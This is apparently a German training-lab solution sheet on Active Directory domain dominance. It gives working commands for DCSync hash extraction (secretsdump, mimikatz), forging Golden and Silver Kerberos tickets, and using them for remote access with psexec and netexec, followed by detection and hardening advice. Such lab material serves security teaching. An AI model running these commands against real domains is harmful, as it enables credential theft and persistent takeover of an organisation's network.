# Lösung – Übung 09: DCSync & Domain Dominance

`<DC>` = DC, DA-Creds `lab.local\da_admin`. **Snapshots!**

## 1. DCSync

```bash
# nur krbtgt:
secretsdump.py lab.local/da_admin:'Passwort'@<DC> -just-dc-user krbtgt
# alle Domänen-Hashes:
secretsdump.py lab.local/da_admin:'Passwort'@<DC> -just-dc
# per Hash:
secretsdump.py -hashes :<NT> lab.local/da_admin@<DC> -just-dc-user krbtgt
```
mimikatz-Variante (Windows): `lsadump::dcsync /domain:lab.local /user:krbtgt`.
Ergebnis: `krbtgt:502:...:<NT-Hash>:::` + Domänen-SID.

## 2. Wofür krbtgt reicht

Der **krbtgt-NT-Hash** signiert alle TGTs. Damit kann man **Golden Tickets** erzeugen: ein TGT für **jede** Identität (auch erfundener „DA"), beliebig lange gültig. Das ist **Persistence** – es bleibt gültig, bis das **krbtgt-Passwort zweimal** zurückgesetzt wurde (zwei Generationen).

## 3. Golden vs. Silver Ticket

**Golden (mimikatz):**
```
kerberos::golden /user:fakeadmin /domain:lab.local /sid:<DOMAIN-SID> /krbtgt:<krbtgt-NT> /ptt
```
Impacket: `ticketer.py -nthash <krbtgt-NT> -domain-sid <SID> -domain lab.local fakeadmin` → `.ccache` → `export KRB5CCNAME=...`.
**Silver:** `ticketer.py -nthash <SERVICE-ACCOUNT-NT> -domain-sid <SID> -domain lab.local -spn cifs/host fakeuser` → TGS für **nur diesen Dienst** (leiser, kein DC-Kontakt nötig).

## 4. Zugriff mit Ticket

```bash
export KRB5CCNAME=fakeadmin.ccache
psexec.py -k -no-pass lab.local/fakeadmin@<ZIEL>
netexec smb <ZIEL> --use-kcache
```

## 5. Erkennung & Abwehr

- **DCSync-Monitoring:** Replikation (**Event 4662** mit `DS-Replication-Get-Changes`) von einem **Nicht-DC** = Alarm.
- **DCSync-Rechte** nur DCs/explizit nötige Konten (BloodHound-Audit).
- **krbtgt-Reset** (2×) nach Kompromittierung; **Tier-0-Schutz** (DA/DC isoliert), AES, EDR, Ticket-Lifetime-Policies, „Golden Ticket"-Heuristiken.

## Härtung

Least privilege für Replikationsrechte, Tier-0-Modell, regelmäßiger krbtgt-Reset-Prozess, Monitoring auf anomale TGT/4662.

## Häufige Fehler / Troubleshooting

- **DCSync „access denied":** Account hat keine Replikationsrechte → DA/Rechte aus BloodHound.
- **Golden Ticket wirkt nicht:** falsche Domain-SID/krbtgt-Hash; Clock-Skew; `KRB5CCNAME` gesetzt?
- **Invasiv:** krbtgt/Tickets → Snapshots, danach Lab zurücksetzen.
- **AES vs RC4:** moderne Umgebungen erwarten AES-Keys im Ticket.
